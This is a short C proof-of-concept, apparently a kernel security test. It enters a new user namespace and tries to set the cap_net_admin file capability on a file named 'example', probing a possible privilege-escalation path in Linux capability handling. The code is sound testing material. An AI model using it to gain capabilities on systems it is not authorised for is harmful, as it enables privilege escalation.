//  gcc -Wl,--no-as-needed -lcap subverting_setfcap.c 
#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <linux/capability.h>
#include <sys/capability.h>

int main(int argc, char **argv)
{
    if (unshare(CLONE_NEWUSER))
    {
		fprintf(stderr, "++ unshare failed: %m\n");
		return 1;
    }
    cap_t cap = cap_from_text("cap_net_admin+ep");
    if (cap_set_file("example", cap))
    {
		fprintf(stderr, "++ cap_set_file failed: %m\n");
		cap_free(cap);
		return 1;
    }
    cap_free(cap);
	return 0;
}